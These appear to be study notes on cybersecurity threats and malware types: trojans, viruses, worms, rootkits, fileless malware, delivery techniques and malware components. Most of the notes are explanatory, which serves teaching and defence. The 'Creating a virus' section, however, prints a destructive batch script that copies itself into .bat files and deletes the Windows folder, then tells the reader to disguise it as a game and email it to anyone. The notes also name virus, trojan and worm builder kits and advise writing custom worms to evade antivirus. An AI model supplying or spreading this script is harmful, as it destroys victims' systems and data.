# Introduction

## Threats

- A threat is a potential for violation of security, which exists when there is a circumstance, capability, action, or event that could breach security and cause harm.
- Attackers use cyber threats to gain unauthorized access to systems in order to steal sensitive data or to disrupt operations.

### Sources of threats

- There are three main sources of threats:

  - Natural threats :

        Natural Threats include :
            - Floods
            - Earthquakes
            - Tornadoes
            - Hurricanes
            - Power outages

  - Unintentional threats :
    Unintentional threats include : - Human error - Software or hardware failure - Unskilled administrators

  - Intentional threats
    - Internal threats :
      - Internal threats include :
        - Fired Employees
        - Service providers
        - Contractors
    - External threats :
      - External threats include :
        - Hackers
        - Criminals
        - Terrorists
        - Foriegn Intelligence agents

## Malware

### Types of malware

Some of the common types of malware are :

- **Trojans** : Trojans are malicious programs that looks innocent and harmless but possess harmful code.

  - Trojans gets activated when the user performs some predefined activity.
  - Trojans create a covert communication channel between the victim computer and the attacker.

  - Some indicators of trojan attacks are :

    - Computer screen blinks or any abnormal behavior.
    - Default background wallpaper settings change automatically.
    - Web pages suddenly opens without input from the user.
    - Color setting of the OS changes automatically.
    - Antivirus programs are disabled automatically.
    - Pop ups with bizzare messages suddenly appear.

  - How are trojans used by hackers :

    - To delete or replace critical OS files.
    - Record screenshots, audio, or video of the victim PC
    - Use victim's PC for spammming and blasting messages.
    - Download spyware, adware or any malicious code.
    - Disable firewall or antivirus programs.
    - Create backdoors.
    - Steal sensitive information.
    - Encrypt files and demand ransom.

  - Common ports used by trojans :

    ![Common ports used by trojans](https://pbs.twimg.com/media/CT9KXV5WcAEXXxJ?format=jpg&name=900x900)

  - How to create a trojan

    - Trojan horse construction kits help attackers to construct trojans easily.
    - The tools in these kits can be dangerous and can backfire of not properly used.
    - Some of the construction kits are :
      - DarkHorse Trojan Virus Maker
      - Senna Spy Trojan generator.
      - Trojan Horse Construction kit.

  - Virus :

    - A virus is a self replicating program that produces its own copies by attaching itself to another program, computer boot sector or document.
    - A virus can spread from one computer to another through removable media, internet downloads, and email attachments.

    - Some characteristics of viruses are :

      - Viruses are self replicating.
      - Viruses are platform dependent.
      - Viruses are destructive.
      - Viruses are memory resident.
      - Viruses are stealthy.
      - Viruses are polymorphic.
      - Viruses are encrypted.
      - Viruses are slow.
      - Viruses are difficult to detect.
      - Viruses are difficult to remove.

    - Indicators of virus attacks are :

      - Processes require more time and resources.
      - Computer beeps with no display
      - Drive label changes and OS doesnot load.
      - Computer freezes or any BSOD (Blue Screen of Death) appears.
      - Files and folders missing.
      - Suspicious hard drive activity.
      - Browser window freezes.

    - Some types of viruses are :

      - Boot sector virus :
        - A boot sector virus infects the boot sector of a hard drive or a floppy disk.
        - It infects the boot sector by replacing the boot code with its own code.
        - It is also known as a master boot record virus.
        - It is difficult to detect and remove.
        - It can be prevented by using antivirus software and by not using pirated software.
      - File infecting virus :
        - A file infecting virus infects executable files such as .exe and .com files.
        - It infects the executable files by inserting its code into the file.
        - It is also known as a parasitic virus.
        - It is difficult to detect and remove.
        - It can be prevented by using antivirus software and by not using pirated software.
      - Macro virus :
        - A macro virus infects documents that are created using applications or programs that contain macros such as Microsoft Word, Microsoft Excel, Microsoft Access, etc.
        - It infects the documents by inserting its code into the document.
        - It is difficult to detect and remove.
        - It can be prevented by using antivirus software and by not using pirated software.
      - Multipartite virus :
        - A multipartite virus infects both boot sector and executable files.
        - It is difficult to detect and remove.
        - It can be prevented by using antivirus software and by not using pirated software.
      - Polymorphic virus :
        - A polymorphic virus changes its code every time it infects a new file.
        - It is difficult to detect and remove.
        - It can be prevented by using antivirus software and by not using pirated software.
      - Stealth virus :
        - A stealth virus hides itself from antivirus software.
        - It is difficult to detect and remove.
        - It can be prevented by using antivirus software and by not using pirated software.
      - Armored virus :
        - An armored virus protects itself from antivirus software.
        - It is difficult to detect and remove.
        - It can be prevented by using antivirus software and by not using pirated software.
      - Encrypted virus :
        - An encrypted virus encrypts its code to avoid detection.
        - It is difficult to detect and remove.
        - It can be prevented by using antivirus software and by not using pirated software.
      - Companion virus :
        - A companion virus creates a file with the same name as that of the executable file.

    - Creating a virus :

      Virus can be created using two methods :

      - Using virus construction kits.
      - Writing virus programs :

        - To create a virus program, create a .bat file with this code :

         ```
          @ echo off
          for %%f in (
            *.bat
          ) do 
          copy %%f + Game.bat 
          del C:/Windows/*.*
         ```
        - Save the file as `Game.bat`.
        - Convert the bat file into a Game.com file.
        - Send this file to anyone as an email attachement.
        - When run, the file copies itself to all the bat files in the current directory and deletes all the files in the windows folder.

      - Some virus maker tools are :

        - DELmE's Batch virus maker.
        - Bhavesh Virus maker SKW
        - Deadly virus maker.
        - JPS virus maker.

  - Ransomware : 
    
    - A ransomware is a type of malware that encrypts the victim's files and demands a ransom to decrypt them.

  - Worms : 

    - Worms are malicious programs that replicate themselves to spread to other computers.
    - Worms do not require a host program to spread.
    - Worms use resources and slow down the computer.

    - How to create a worm ? : 

      - Some worm makers are : 
        - Internet Worm maker thing
        - Batch worm generator
        - C++ worm generator

    - NOTE : If you are a pen tester, it is recommended not to use the maker tools instead create your own worm. Because the malware created using these tools are easily detected by antivirus software.

  - Rootkits : 

    - A rootkit is a malicious program that provides the attacker with administrator level access to the victim's computer without the victim's knowledge.

    - Rootkits replace certain OS calls and utilities with their own modified versions of those routines that, in turn, undermine security of the target.

  - Potentially Unwanted Programs / Applications (PUPs / PUAs ) : : 

    - also known as grayware, are software programs that present a risk or nuisance to the user but are not classified as malware.

    - PUAs covertly monitor and alter user data or settings in the system.

  - Fileless malware : 
  
    - Fileless malware is a type of malware that does not use any files to infect the system.

    - It is also known as memory based malware.

    - Fileless malware are stealthy and trustworthy.

    - Fileless malware can be transmitted through : 

      - Phishing emails.
      - Malicious websites.
      - Registry manipulation.
      - Legitimate software.
      - Native applications.
      - Script-based injection.
      - Infection through lateral movement.

    - Countermeasures against fileless malware include : 

      - Removing all administrative tools and restrict access through Windows Group Policy or Windows Applocker.
      - Disable flash in the browser settings.
      - Disable Powershell and WMI when not in use.
      - Disable PDF readers to automatically run javascript.
      - Run periodic AV scans to detect and update.

### Common techniques to install malware on the web

- Black hat SEO : Ranking malware page highly in search results.

- Social Engineered Click-jacking : Tricking the users into clicking on innocent looking websites.

- Spear-phishing : Mimicking legimitate institutions in an attempt to steal login credentials.

- Malvertising : Embedding malware in ad-networks that display across hundreds of legimitate sites.

- Compromised Legimitate Websites.

- Drive-by Downloads : Exploiting flaws in browser software to install malware just by visiting a web page.

- Spam email.

### Components of a malware

The components of a malware system depend on the requirements of the malware author who designed it for specific target.

- Crypter : Software that protects the malware from undergoing reverse engineering or analysis.

- Downloader : A type of trojan that downloads other malware from the internet to the PC.

- Dropper : A type of trojan that covertly installs other malware files on the system.

- Exploit : A malicious code that breaches the system security via software vulnerabilities to access the information or install malware.

- Injector : A program that injects its code into other vulnerable running processes and changes how they execute to hide or prevent its removal.

- Obfuscator : A program that conceals its code and intended purpose via various techniques, and thus, makes it hard for security mechanisms to detect or remove it.

- Packer : A program that allows all files to bundle together into a single executable file via compression to bypass.

- Payload : A piece of software that allows control over a computer system after it has been explioted.

- Malicious code : A command that defines malware's basic functionality such as stealing data.
